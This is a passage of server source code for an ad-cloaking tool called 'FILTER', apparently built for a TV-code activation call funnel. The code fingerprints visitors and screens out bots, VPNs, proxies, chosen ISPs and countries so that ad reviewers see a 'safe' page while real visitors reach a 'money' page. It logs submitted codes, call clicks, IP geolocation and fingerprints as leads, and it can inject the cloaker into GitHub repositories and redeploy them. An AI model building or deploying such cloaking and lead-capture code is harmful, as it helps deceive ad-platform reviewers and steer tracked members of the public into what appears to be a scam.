    const r = await railwayGraphQL(q, token);
    const projects = r?.data?.projects?.edges || [];
    for (const { node: proj } of projects) {
      if (proj.name.toLowerCase().includes(repoName.toLowerCase()) ||
          repoName.toLowerCase().includes(proj.name.toLowerCase())) {
        site.railwayProjectId = proj.id;
        const firstSvc = proj.services?.edges?.[0]?.node;
        if (firstSvc) site.railwayServiceId = firstSvc.id;
        const idx = _cacheSites.findIndex(s => s.id === site.id);
        if (idx !== -1) { _cacheSites[idx].railwayProjectId = proj.id; if (firstSvc) _cacheSites[idx].railwayServiceId = firstSvc.id; }
        await saveSites().catch(() => {});
        break;
      }
    }
  } catch(e) {}
}

async function pollRailwayStatus(site, token) {
  if (!site.railwayProjectId || !site.railwayServiceId) return;
  try {
    const q = `{ deployments(input:{projectId:"${site.railwayProjectId}",serviceId:"${site.railwayServiceId}"}) { edges { node { id status } } } }`;
    const r = await railwayGraphQL(q, token);
    const status = r?.data?.deployments?.edges?.[0]?.node?.status || 'UNKNOWN';
    const mapped = { 'SUCCESS':'live','FAILED':'failed','CRASHED':'failed','BUILDING':'building','DEPLOYING':'building','QUEUED':'building' }[status] || 'pending';
    const idx = _cacheSites.findIndex(s => s.id === site.id);
    if (idx !== -1 && _cacheSites[idx].deployStatus !== mapped) {
      _cacheSites[idx].deployStatus = mapped;
      await saveSites().catch(() => {});
      broadcast('siteStatus', { id: site.id, deployStatus: mapped });
    }
  } catch(e) {}
}

// Poll Railway deploy status every 2 minutes for sites in building state
setInterval(async () => {
  const token = getRailwayToken();
  if (!token) return;
  for (const site of _cacheSites) {
    if (site.deployStatus === 'building') {
      await pollRailwayStatus(site, token);
    }
  }
}, 2 * 60 * 1000);

// ─── EXPRESS APP ─────────────────────────────────────────────────────────────
const app = express();
app.set('trust proxy', 1);
app.disable('x-powered-by');
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: SESSION_SECRET,
  resave: false, saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 8 * 60 * 60 * 1000
  }
}));
// ─── CHANNEL CLOAKER (must be BEFORE express.static) ────────────────────────
// Intercepts GET /<channel-slug> and /<channel-slug>.html for the 11 channel
// pages.  All other paths fall through to express.static / route handlers.
app.use(async (req, res, next) => {
  if (req.method !== 'GET') return next();
  let p = req.path.slice(1); // strip leading '/'
  if (p.endsWith('.html')) p = p.slice(0, -5);
  if (CHANNEL_SLUGS.has(p)) {
    try { return await handleChannelPage(req, res, p); }
    catch (e) { console.error('[channel mw]', e.message); return next(); }
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public')));

// ─── ADMIN AUTH MIDDLEWARE ─────────────────────────────────────────────────────
function requireAdmin(req, res, next) {
  if (req.session && req.session.adminAuth) return next();
  res.redirect('/' + ADMIN_PATH + '/login');
}

// ─── BLOCK /admin routes ───────────────────────────────────────────────────────
app.get('/admin', (req,res) => res.status(404).end());
app.get('/admin/login', (req,res) => res.status(404).end());

// ─── PUBLIC API — PIXEL ───────────────────────────────────────────────────────
app.post('/api/v1/pixel', async (req, res) => {
  const apiKey = req.headers['x-client-id'];
  const site = getSite(apiKey);
  if (!site) return res.json({ decision: 'allow', url: '/' });
  const ip = getIP(req);
  try {
    const result = await runCloakChecks(ip, req.body, site, _cacheSettings);
    const url = result.decision === 'allow' ? (site.moneyUrl || _cacheSettings.moneyUrl || '/offer') : (site.safeUrl || _cacheSettings.safeUrl || '/safe');
    logVisit(ip, site, result).catch(() => {});
    res.json({ decision: result.decision, url });
  } catch(e) {
    console.error('[pixel]', e.message);
    res.json({ decision: 'allow', url: site.moneyUrl || '/offer' });
  }
});

// ─── PUBLIC API — VERIFY (channel page client-side check pass) ──────────────
// public/activate.js POSTs the visitor's full client fingerprint (webdriver,
// plugins, screen, fingerprint hash, tz) on page load.  We re-run the SAME
// 11-check decision the cloaker uses with apiKey-based pixel calls.  If the
// visitor flunks any check that the server's first-paint pass cannot see,
// we return decision='block' and the page redirects itself to safe.html.
app.post('/api/v1/verify', async (req, res) => {
  try {
    const body = req.body || {};
    const channel = (body.channel || '').toString().substring(0, 50);
    const site = getChannelSite(channel);
    if (!site) return res.json({ decision: 'allow', url: '/' });
    const ip = getIP(req);
    // The channel first-paint middleware already ran the per-IP+per-channel
    // repeat check on this same visit, so skip it here to avoid an immediate
    // false repeat-click block on the legitimate verify call that follows.
    const result = await runCloakChecks(ip, body, site, _cacheSettings, { skipRepeat: true });
    const url = result.decision === 'allow'
      ? '/' + channel + '.html'
      : (site.safeUrl || _cacheSettings.safeUrl || '/safe');
    res.json({ decision: result.decision, url, reason: result.reason });
  } catch (e) {
    console.error('[verify]', e.message);
    res.json({ decision: 'allow', url: '/' });
  }
});

// ─── PUBLIC API — CODE SUBMIT (channel funnel step 1 -> 2) ──────────────────
// First-party endpoint used by /public/activate.js.  Resolves the site by
// channel slug (no apiKey required since this is hosted on entermytvcode.com).
app.post('/api/v1/code-submit', async (req, res) => {
  res.json({ ok: true });
  try {
    const ip = getIP(req);
    const body = req.body || {};
    const channel = (body.channel || '').toString().substring(0, 50);
    const site = getChannelSite(channel);
    const ipData = await ipLookup(ip);
    const lead = {
      ts: new Date().toISOString(), ip,
      site_id: site ? site.id : 'unknown',
      type: 'code_submit',
      country: ipData.countryCode || 'XX',
      city: ipData.city || '', region: ipData.regionName || '',
      isp: ipData.isp || '', org: ipData.org || '',
      ua: (req.headers['user-agent'] || '').substring(0, 500),
      code: (body.code || '').toString().substring(0, 20).toUpperCase(),
      screen: (body.screen || '').toString().substring(0, 30),
      tz: (body.tz || '').toString().substring(0, 100),
      // Full client fingerprint (persisted in cloaker_leads.extra JSONB)
      fingerprint: (body.fingerprint || '').toString().substring(0, 64),
      plugins:  Number.isFinite(+body.plugins) ? +body.plugins : null,
      wd:       !!body.wd,
      lang:     (body.lang || '').toString().substring(0, 200),
      utm_source:   (body.utm_source   || '').toString().substring(0, 100),
      utm_campaign: (body.utm_campaign || '').toString().substring(0, 100),
      utm_medium:   (body.utm_medium   || '').toString().substring(0, 100),
      utm_content:  (body.utm_content  || '').toString().substring(0, 100),
      utm_term:     (body.utm_term     || '').toString().substring(0, 100),
      gclid:        (body.gclid        || '').toString().substring(0, 100),
      referrer: (body.referrer || req.headers.referer || '').toString().substring(0, 300),
      called: false
    };
    await saveLead(lead);
    broadcast('statsUpdate', getQuickStats());
  } catch (e) { console.error('[code-submit]', e.message); }
});

// ─── PUBLIC API — CALL CLICK (channel funnel CTA) ────────────────────────────
app.post('/api/v1/call-click', async (req, res) => {
  res.json({ ok: true });
  try {
    const ip = getIP(req);
    const body = req.body || {};
    const channel = (body.channel || '').toString().substring(0, 50);
    const site = channel ? getChannelSite(channel) : null;
    const cutoff = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    // Only attribute the call to the most recent CODE-SUBMIT lead — other
    // lead types (e.g. previous standalone call_click) must not be flipped.
    const idx = _cacheLeads.findIndex(l =>
      l.ip === ip && l.ts >= cutoff && l.type === 'code_submit' &&
      (!site || l.site_id === site.id)
    );
    if (idx !== -1) {
      _cacheLeads[idx].called = true;
      _cacheLeads[idx].called_at = new Date().toISOString();
      if (pool) {
        const params = [_cacheLeads[idx].called_at, ip, cutoff];
        let where = `ip=$2 AND ts>=$3 AND type='code_submit'`;
        if (site) { where += ' AND site_id=$4'; params.push(site.id); }
        await dbQuery(
          `UPDATE cloaker_leads SET called=true, called_at=$1
           WHERE id = (SELECT id FROM cloaker_leads WHERE ${where} ORDER BY ts DESC LIMIT 1)`,
          params
        );
      }
      if (!pool) writeJson('leads.json', _cacheLeads.slice(0, 500));
      broadcast('newLead', _cacheLeads[idx]);
    } else {
      // No prior code submit found (user clicked Call without entering code) — log a stand-alone call lead
      const ipData = await ipLookup(ip);
      const lead = {
        ts: new Date().toISOString(), ip,
        site_id: site ? site.id : 'unknown',
        type: 'call_click',
        country: ipData.countryCode || 'XX',
        city: ipData.city || '', region: ipData.regionName || '',
        isp: ipData.isp || '', org: ipData.org || '',
        ua: (req.headers['user-agent'] || '').substring(0, 500),
        code: '(call-only)',
        screen: (body.screen || '').toString().substring(0, 30),
        tz:     (body.tz     || '').toString().substring(0, 100),
        // Carry the same client fingerprint through call-only leads so
        // attribution + bot-filtering reports stay consistent.
        fingerprint: (body.fingerprint || '').toString().substring(0, 64),
        plugins:  Number.isFinite(+body.plugins) ? +body.plugins : null,
        wd:       !!body.wd,
        utm_source: '', utm_campaign: '', utm_medium: '',
        utm_content: '', utm_term: '', gclid: '',
        referrer: (req.headers.referer || '').substring(0, 300),
        called: true, called_at: new Date().toISOString()
      };
      await saveLead(lead);
    }
    broadcast('statsUpdate', getQuickStats());
  } catch (e) { console.error('[call-click]', e.message); }
});

// ─── PUBLIC API — EVENTS (legacy / 3rd-party site script) ────────────────────
app.post('/api/v1/event', async (req, res) => {
  res.json({ ok: true });
  const apiKey = req.headers['x-client-id'] || req.headers['x-site-key'];
  const site = getSite(apiKey);
  const ip = getIP(req);
  const body = req.body || {};
  const type = body.type || '';
  if (type === 'code_submit') {
    const ipData = await ipLookup(ip);
    const lead = {
      ts: new Date().toISOString(), ip, site_id: site ? site.id : 'unknown',
      type, country: ipData.countryCode || 'XX', city: ipData.city || '',
      region: ipData.regionName || '', isp: ipData.isp || '', org: ipData.org || '',
      ua: (req.headers['user-agent'] || '').substring(0, 500),
      code: (body.code || '').substring(0, 20).toUpperCase(),
      screen: body.screen || '', tz: body.tz || '',
      utm_source: body.utm_source || '', utm_campaign: body.utm_campaign || '',
      utm_medium: body.utm_medium || '', utm_content: body.utm_content || '',
      utm_term: body.utm_term || '', gclid: body.gclid || '',
      referrer: (req.headers.referer || '').substring(0, 300),
      called: false
    };
    await saveLead(lead);
  } else if (type === 'call_click') {
    const cutoff = new Date(Date.now() - 30 * 60 * 1000).toISOString();
    // Constrain to code-submit leads so we never flip a non-conversion lead.
    const idx = _cacheLeads.findIndex(l => l.ip === ip && l.ts >= cutoff && l.type === 'code_submit' && (!site || l.site_id === site.id));
    if (idx !== -1) {
      _cacheLeads[idx].called = true;
      _cacheLeads[idx].called_at = new Date().toISOString();
      if (pool) {
        const lead = _cacheLeads[idx];
        const siteClause = site ? 'AND site_id=$4' : '';
        const params = [lead.called_at, ip, cutoff];
        if (site) params.push(site.id);
        await dbQuery(
          `UPDATE cloaker_leads SET called=true, called_at=$1 WHERE id = (
             SELECT id FROM cloaker_leads WHERE ip=$2 AND ts>=$3 AND type='code_submit' ${siteClause} ORDER BY ts DESC LIMIT 1
           )`,
          params);
      }
      if (!pool) writeJson('leads.json', _cacheLeads.slice(0,500));
    }
  }
});

// ─── ADMIN LOGIN ──────────────────────────────────────────────────────────────
app.get('/' + ADMIN_PATH + '/login', (req, res) => {
  const err = req.query.error ? '<div class="err">Incorrect password. Try again.</div>' : '';
  res.send(`<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>FILTER — Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:system-ui,-apple-system,sans-serif;background:#f1f5f9;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.card{background:#fff;border-radius:16px;padding:40px;width:100%;max-width:380px;box-shadow:0 4px 24px rgba(0,0,0,0.1);}
.logo{display:flex;align-items:center;gap:12px;margin-bottom:28px;}
.logo-icon{width:44px;height:44px;border-radius:10px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:900;font-size:18px;}
.logo-text h1{font-size:1.2rem;font-weight:800;color:#0f172a;}
.logo-text p{font-size:0.75rem;color:#64748b;}
h2{font-size:1.1rem;font-weight:700;color:#0f172a;margin-bottom:6px;}
.sub{font-size:0.85rem;color:#64748b;margin-bottom:24px;}
label{display:block;font-size:0.82rem;font-weight:600;color:#374151;margin-bottom:6px;}
input{width:100%;padding:10px 14px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:0.95rem;outline:none;transition:border 0.2s;}
input:focus{border-color:#3b82f6;}
button{width:100%;margin-top:16px;padding:11px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:0.95rem;font-weight:600;cursor:pointer;transition:background 0.2s;}
button:hover{background:#2563eb;}
.err{background:#fee2e2;color:#dc2626;border-radius:8px;padding:10px 14px;font-size:0.85rem;margin-bottom:16px;}
</style></head><body>
<div class="card">
  <div class="logo">
    <div class="logo-icon">F</div>
    <div class="logo-text"><h1>FILTER</h1><p>Traffic Management</p></div>
  </div>
  <h2>Sign in to your dashboard</h2>
  <p class="sub">Enter your admin password to continue</p>
  ${err}
  <form method="POST">
    <label>Password</label>
    <input type="password" name="password" autofocus required>
    <button type="submit">Sign In &rarr;</button>
  </form>
</div>
</body></html>`);
});

app.post('/' + ADMIN_PATH + '/login', async (req, res) => {
  const pwd = req.body.password || '';
  const ok = await bcrypt.compare(pwd, ADMIN_PASSWORD_HASH);
  if (ok) {
    req.session.adminAuth = true;
    req.session.tz = req.session.tz || _cacheSettings.timezone || 'UTC';
    res.redirect('/' + ADMIN_PATH);
  } else {
    res.redirect('/' + ADMIN_PATH + '/login?error=1');
  }
});

app.get('/' + ADMIN_PATH + '/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/' + ADMIN_PATH + '/login');
});

// ─── SSE ──────────────────────────────────────────────────────────────────────
app.get('/' + ADMIN_PATH + '/events', requireAdmin, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();
  const onSse = ({ type, data }) => {
    res.write(`event: ${type}\ndata: ${JSON.stringify(data)}\n\n`);
  };
  emitter.on('sse', onSse);
  const ping = setInterval(() => res.write(': ping\n\n'), 25000);
  req.on('close', () => { emitter.off('sse', onSse); clearInterval(ping); });
});

// ─── ADMIN AJAX ───────────────────────────────────────────────────────────────
app.get('/' + ADMIN_PATH + '/live-visitors', requireAdmin, (req, res) => {
  res.json(getActiveVisitors());
});

app.get('/' + ADMIN_PATH + '/api/stats', requireAdmin, (req, res) => {
  const range = parseInt(req.query.range) || 1;
  const siteFilter = req.query.site || 'all';
  // Support custom date range: from/to query params (ISO date strings)
  let cutoff, cutoffEnd;
  if (req.query.from) {
    cutoff = new Date(req.query.from).toISOString();
    cutoffEnd = req.query.to ? new Date(req.query.to + 'T23:59:59Z').toISOString() : new Date().toISOString();
  } else {
    cutoff = new Date(Date.now() - range * 24 * 3600 * 1000).toISOString();
    cutoffEnd = new Date().toISOString();
  }
  let logs = _cacheLogs.filter(l => l.ts >= cutoff && l.ts <= cutoffEnd);
  let leads = _cacheLeads.filter(l => l.ts >= cutoff && l.ts <= cutoffEnd);
  if (siteFilter && siteFilter !== 'all') {
    logs  = logs.filter(l => l.site_id === siteFilter);
    leads = leads.filter(l => l.site_id === siteFilter);
  }
  const allowed = logs.filter(l => l.decision === 'allow').length;
  const blocked = logs.filter(l => l.decision === 'block').length;
  // reasons
  const reasons = {};
  logs.filter(l => l.decision === 'block').forEach(l => { reasons[l.reason] = (reasons[l.reason]||0)+1; });
  // countries
  const countries = {};
  logs.forEach(l => {
    if (!l.country) return;
    if (!countries[l.country]) countries[l.country] = { total:0, allowed:0, blocked:0 };
    countries[l.country].total++;
    if (l.decision==='allow') countries[l.country].allowed++;
    else countries[l.country].blocked++;
  });
  const topCountries = Object.entries(countries).sort((a,b)=>b[1].total-a[1].total).slice(0,8)
    .map(([code,v]) => ({ code, ...v }));
  // hourly
  const hourly = {};
  logs.forEach(l => {
    if (!l.ts) return;
    const s = (typeof l.ts === 'string') ? l.ts : new Date(l.ts).toISOString();
    const h = s.slice(0,13);
    if (!hourly[h]) hourly[h] = { allow:0, block:0 };
    hourly[h][l.decision]++;
  });
  res.json({ total: logs.length, allowed, blocked, leads: leads.length,
    blockRate: logs.length ? Math.round(blocked/logs.length*100) : 0,
    reasons, topCountries, hourly,
    activeVisitors: activeVisitors.size });
});

app.get('/' + ADMIN_PATH + '/api/logs', requireAdmin, (req, res) => {
  const page = parseInt(req.query.page)||1;
  const per = 50;
  let logs = [..._cacheLogs];
  if (req.query.decision && req.query.decision !== 'all') logs = logs.filter(l => l.decision === req.query.decision);
  if (req.query.site && req.query.site !== 'all') logs = logs.filter(l => l.site_id === req.query.site);
  if (req.query.channel && req.query.channel !== 'all') logs = logs.filter(l => (l.page||'') === req.query.channel);
  if (req.query.q) { const q = req.query.q.toLowerCase(); logs = logs.filter(l => (l.ip||'').includes(q)||(l.isp||'').toLowerCase().includes(q)||(l.city||'').toLowerCase().includes(q)||(l.country||'').toLowerCase().includes(q)); }
  if (req.query.date) logs = logs.filter(l => tsDay(l.ts) === req.query.date);
  const total = logs.length;
  const pages = Math.ceil(total/per);
  const items = logs.slice((page-1)*per, page*per);
  res.json({ items, total, page, pages });
});

app.get('/' + ADMIN_PATH + '/api/leads', requireAdmin, (req, res) => {
  const page = parseInt(req.query.page)||1;
  const per = 50;
  let leads = [..._cacheLeads];
  if (req.query.site && req.query.site !== 'all') leads = leads.filter(l => l.site_id === req.query.site);
  if (req.query.channel && req.query.channel !== 'all') {
    const targetSite = _cacheSites.find(s => s.channelSlug === req.query.channel);
    if (targetSite) leads = leads.filter(l => l.site_id === targetSite.id);
  }
  const total = leads.length;
  const items = leads.slice((page-1)*per, page*per);
  res.json({ items, total, page, pages: Math.ceil(total/per) });
});

app.get('/' + ADMIN_PATH + '/export-leads', requireAdmin, (req, res) => {
  const cols = ['ts','ip','country','city','code','utm_source','utm_campaign','called','called_at','site_id','ua'];
  const csv = [cols.join(','), ..._cacheLeads.map(l => cols.map(c => '"'+(l[c]||'').toString().replace(/"/g,'""')+'"').join(','))].join('\n');
  res.setHeader('Content-Type','text/csv');
  res.setHeader('Content-Disposition','attachment; filename="leads.csv"');
  res.send(csv);
});

app.post('/' + ADMIN_PATH + '/block-ip-ajax', requireAdmin, async (req, res) => {
  const ip = (req.body.ip || '').trim();
  if (!ip) return res.json({ ok: false });
  if (!_cacheSettings.blockedIps) _cacheSettings.blockedIps = [];
  if (!_cacheSettings.blockedIps.includes(ip)) {
    _cacheSettings.blockedIps.push(ip);
    await saveSettings();
  }
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/unblock-ip-ajax', requireAdmin, async (req, res) => {
  const ip = (req.body.ip || '').trim();
  if (_cacheSettings.blockedIps) {
    _cacheSettings.blockedIps = _cacheSettings.blockedIps.filter(x => x !== ip);
    await saveSettings();
  }
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/set-timezone', requireAdmin, (req, res) => {
  req.session.tz = req.body.tz || 'UTC';
  _cacheSettings.timezone = req.session.tz;
  saveSettings().catch(()=>{});
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/change-password', requireAdmin, async (req, res) => {
  const { current, newPwd, confirm } = req.body;
  if (newPwd !== confirm) return res.json({ ok: false, error: 'Passwords do not match' });
  if (newPwd.length < 6) return res.json({ ok: false, error: 'Password too short' });
  const ok = await bcrypt.compare(current, ADMIN_PASSWORD_HASH);
  if (!ok) return res.json({ ok: false, error: 'Current password incorrect' });
  ADMIN_PASSWORD_HASH = await bcrypt.hash(newPwd, 10);
  fs.writeFileSync(HASH_FILE, ADMIN_PASSWORD_HASH);
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/settings/features', requireAdmin, async (req, res) => {
  const b = req.body;
  _cacheSettings.botBlocking     = b.botBlocking     === 'true' || b.botBlocking     === true;
  _cacheSettings.vpnBlocking     = b.vpnBlocking     === 'true' || b.vpnBlocking     === true;
  _cacheSettings.proxyBlocking   = b.proxyBlocking   === 'true' || b.proxyBlocking   === true;
  _cacheSettings.repeatBlocking  = b.repeatBlocking  === 'true' || b.repeatBlocking  === true;
  _cacheSettings.ispBlocking     = b.ispBlocking     === 'true' || b.ispBlocking     === true;
  _cacheSettings.countryBlocking = b.countryBlocking === 'true' || b.countryBlocking === true;
  _cacheSettings.ispKeywords     = (b.ispKeywords||'').split('\n').map(s=>s.trim()).filter(Boolean);
  _cacheSettings.allowedCountries= (b.allowedCountries||'').split(/[\s,]+/).map(s=>s.trim().toUpperCase()).filter(Boolean);
  _cacheSettings.moneyUrl        = b.moneyUrl || _cacheSettings.moneyUrl || '';
  _cacheSettings.safeUrl         = b.safeUrl  || _cacheSettings.safeUrl  || '';
  await saveSettings();
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/settings/github-token', requireAdmin, (req, res) => {
  const t = (req.body.githubToken || '').trim();
  if (t) fs.writeFileSync(path.join(LOCAL_DIR,'github_token'), t, { mode: 0o600 });
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/settings/railway-token', requireAdmin, (req, res) => {
  const t = (req.body.railwayToken || '').trim();
  if (t) fs.writeFileSync(path.join(LOCAL_DIR,'railway_token'), t, { mode: 0o600 });
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/sites', requireAdmin, async (req, res) => {
  const b = req.body;
  const site = {
    id: 'site-' + Date.now(),
    name: b.name || 'New Site',
    domain: b.domain || '',
    apiKey: crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex'),
    moneyUrl: b.moneyUrl || '', safeUrl: b.safeUrl || '',
    adUrl: b.adUrl || '', githubRepo: b.githubRepo || '',
    railwayProjectId: '', railwayServiceId: '',
    enabled: true, blockedIps: [], allowedCountries: [],
    isDefault: _cacheSites.length === 0,
    deployStatus: 'pending', githubInjected: false,
    createdAt: new Date().toISOString(),
    botBlocking: true, vpnBlocking: true, proxyBlocking: true,
    repeatBlocking: true, ispBlocking: true, countryBlocking: false,
    ispKeywords: []
  };
  _cacheSites.push(site);
  await saveSites();
  // Background inject
  const hubUrl = req.protocol + '://' + req.get('host');
  if (site.githubRepo) githubInject(site, hubUrl).then(ok => {
    const idx = _cacheSites.findIndex(s => s.id === site.id);
    if (idx !== -1) { _cacheSites[idx].githubInjected = ok; saveSites().catch(()=>{}); }
    broadcast('siteStatus', { id: site.id, githubInjected: ok });
  });
  res.json({ ok: true, site });
});

app.post('/' + ADMIN_PATH + '/sites/:id/settings', requireAdmin, async (req, res) => {
  const idx = _cacheSites.findIndex(s => s.id === req.params.id);
  if (idx === -1) return res.json({ ok: false });
  const b = req.body;
  const site = _cacheSites[idx];
  site.name          = b.name          || site.name;
  site.domain        = b.domain        || site.domain;
  site.moneyUrl      = b.moneyUrl      !== undefined ? b.moneyUrl      : site.moneyUrl;
  site.safeUrl       = b.safeUrl       !== undefined ? b.safeUrl       : site.safeUrl;
  site.adUrl         = b.adUrl         !== undefined ? b.adUrl         : site.adUrl;
  site.githubRepo    = b.githubRepo    !== undefined ? b.githubRepo    : site.githubRepo;
  site.allowedCountries = b.allowedCountries ? b.allowedCountries.split(/[\s,]+/).map(s=>s.trim().toUpperCase()).filter(Boolean) : site.allowedCountries;
  if (b.railwayProjectId !== undefined) site.railwayProjectId = b.railwayProjectId;
  if (b.railwayServiceId !== undefined) site.railwayServiceId = b.railwayServiceId;
  // Security toggles
  ['botBlocking','vpnBlocking','proxyBlocking','repeatBlocking','ispBlocking','countryBlocking'].forEach(f => {
    if (b[f] !== undefined) site[f] = b[f] === 'true' || b[f] === true;
  });
  if (b.ispKeywords !== undefined) site.ispKeywords = b.ispKeywords.split('\n').map(s=>s.trim()).filter(Boolean);
  await saveSites();
  // Background inject + deploy
  const hubUrl = req.protocol + '://' + req.get('host');
  if (site.githubRepo) githubInject(site, hubUrl).then(ok => {
    _cacheSites[idx].githubInjected = ok;
    saveSites().catch(()=>{});
    broadcast('siteStatus', { id: site.id, githubInjected: ok });
    if (ok) triggerRailwayDeploy(site).then(deployed => {
      _cacheSites[idx].deployStatus = deployed ? 'building' : 'failed';
      saveSites().catch(()=>{});
      broadcast('siteStatus', { id: site.id, deployStatus: _cacheSites[idx].deployStatus });
    });
  });
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/sites/:id/toggle', requireAdmin, async (req, res) => {
  const idx = _cacheSites.findIndex(s => s.id === req.params.id);
  if (idx !== -1) { _cacheSites[idx].enabled = !_cacheSites[idx].enabled; await saveSites(); }
  res.json({ ok: true, enabled: idx !== -1 ? _cacheSites[idx].enabled : false });
});

app.post('/' + ADMIN_PATH + '/sites/:id/delete', requireAdmin, async (req, res) => {
  _cacheSites = _cacheSites.filter(s => s.id !== req.params.id);
  if (!_cacheSites.length) _cacheSites = [defaultSite()];
  if (!_cacheSites.some(s => s.isDefault)) _cacheSites[0].isDefault = true;
  await saveSites();
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/sites/:id/regenerate-key', requireAdmin, async (req, res) => {
  const idx = _cacheSites.findIndex(s => s.id === req.params.id);
  if (idx !== -1) {
    _cacheSites[idx].apiKey = crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
    await saveSites();
    res.json({ ok: true, apiKey: _cacheSites[idx].apiKey });
  } else res.json({ ok: false });
});

app.post('/' + ADMIN_PATH + '/sites/:id/inject', requireAdmin, async (req, res) => {
  const site = _cacheSites.find(s => s.id === req.params.id);
  if (!site) return res.json({ ok: false });
  const hubUrl = req.protocol + '://' + req.get('host');
  const ok = await githubInject(site, hubUrl);
  const idx = _cacheSites.findIndex(s => s.id === req.params.id);
  if (idx !== -1) { _cacheSites[idx].githubInjected = ok; await saveSites(); }
  res.json({ ok });
  // Trigger Railway redeploy after successful inject
  if (ok) {
    triggerRailwayDeploy(_cacheSites[idx] || site).then(deployed => {
      if (idx !== -1) {
        _cacheSites[idx].deployStatus = deployed ? 'building' : _cacheSites[idx].deployStatus;
        saveSites().catch(() => {});
        broadcast('siteStatus', { id: site.id, deployStatus: _cacheSites[idx].deployStatus });
      }
    }).catch(() => {});
  }
});

app.post('/' + ADMIN_PATH + '/toggle-cloaking', requireAdmin, async (req, res) => {
  _cacheSettings.enabled = !_cacheSettings.enabled;
  await saveSettings();
  res.json({ ok: true, enabled: _cacheSettings.enabled });
});

app.post('/' + ADMIN_PATH + '/clear-logs', requireAdmin, async (req, res) => {
  _cacheLogs = [];
  writeJson('logs.json', []);
  if (pool) await dbQuery('DELETE FROM cloaker_logs');
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/clear-leads', requireAdmin, async (req, res) => {
  _cacheLeads = [];
  writeJson('leads.json', []);
  if (pool) await dbQuery('DELETE FROM cloaker_leads');
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/clear-frequency', requireAdmin, (req, res) => {
  ipFreqStore.clear();
  res.json({ ok: true });
});

app.post('/' + ADMIN_PATH + '/mark-called', requireAdmin, async (req, res) => {
  const { ip, ts } = req.body;
  const idx = _cacheLeads.findIndex(l => l.ip === ip && l.ts === ts);
  if (idx !== -1) {
    _cacheLeads[idx].called = true;
    _cacheLeads[idx].called_at = new Date().toISOString();
    if (pool) await dbQuery(`UPDATE cloaker_leads SET called=true, called_at=$1 WHERE ip=$2 AND ts=$3`,
      [_cacheLeads[idx].called_at, ip, ts]);
    if (!pool) writeJson('leads.json', _cacheLeads.slice(0,500));
  }
  res.json({ ok: true });
});

// ─── ADMIN PANEL ──────────────────────────────────────────────────────────────
app.get('/' + ADMIN_PATH, requireAdmin, (req, res) => {
  res.send(adminHTML());
});
app.get('/' + ADMIN_PATH + '/*', requireAdmin, (req, res) => {
  res.send(adminHTML());
});

// ─── PUBLIC ROUTES ────────────────────────────────────────────────────────────
app.get('/', (req,res) => res.sendFile(path.join(__dirname,'public','index.html')));
app.get('/safe', (req,res) => res.sendFile(path.join(__dirname,'public','safe.html')));
app.get('/offer', (req,res) => res.sendFile(path.join(__dirname,'public','offer.html')));

app.get('/sites/:id/safe', (req,res) => {
  const site = _cacheSites.find(s => s.id === req.params.id);
  if (site && site.safeUrl) return res.redirect(site.safeUrl);
  res.sendFile(path.join(__dirname,'public','safe.html'));
});
app.get('/sites/:id/money', (req,res) => {
  const site = _cacheSites.find(s => s.id === req.params.id);
  if (site && site.moneyUrl) return res.redirect(site.moneyUrl);
  res.sendFile(path.join(__dirname,'public','offer.html'));
});

// Catch-all for channel pages
app.get('/:page', (req, res) => {
  const page = req.params.page;
  const fp = path.join(__dirname, 'public', page + '.html');
  res.sendFile(fp, err => {
    if (err) res.status(404).sendFile(path.join(__dirname,'public','index.html'));
  });
});

// ─── ADMIN HTML ───────────────────────────────────────────────────────────────
function adminHTML() {
  const sites = _cacheSites;
  const settings = _cacheSettings;
  const sitesJson = JSON.stringify(sites);
  const settingsJson = JSON.stringify(settings);
  const adminPath = ADMIN_PATH;

  return `<!DOCTYPE html>
<html lang="en" class="">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FILTER — Admin</title>
<style>
:root{
  --bg:#f1f5f9;--card:#fff;--border:#e2e8f0;--text:#0f172a;--text2:#374151;--text3:#64748b;
  --pri:#3b82f6;--pri-l:#eff6ff;--green:#22c55e;--red:#ef4444;--orange:#f97316;--purple:#a855f7;
  --sidebar:#fff;--sidebar-w:240px;--topbar:#fff;
}
html.dark{
  --bg:#0f172a;--card:#1e293b;--border:#334155;--text:#f1f5f9;--text2:#cbd5e1;--text3:#94a3b8;
  --sidebar:#1e293b;--topbar:#1e293b;--pri-l:#1e3a5f;
}
*{margin:0;padding:0;box-sizing:border-box;}
